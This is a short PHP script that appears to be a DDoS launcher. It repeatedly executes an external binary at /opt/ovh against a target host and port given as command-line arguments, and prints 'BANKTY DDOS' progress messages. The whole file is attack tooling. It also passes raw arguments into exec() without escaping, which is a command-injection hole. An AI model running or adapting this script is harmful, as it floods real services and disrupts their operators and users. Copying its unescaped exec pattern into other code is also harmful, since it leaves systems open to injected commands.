<?php
for ($x = 0; $x <= $argv[3]; $x++) {
	$rand = rand(1,30);
	exec('/opt/ovh '.$argv[1].' '.$argv[2].' '.$rand.' 1');
	echo "BY: BANKTY DDOS ".$argv[1].":".$argv[2]." LOOP $x \n";
}
?>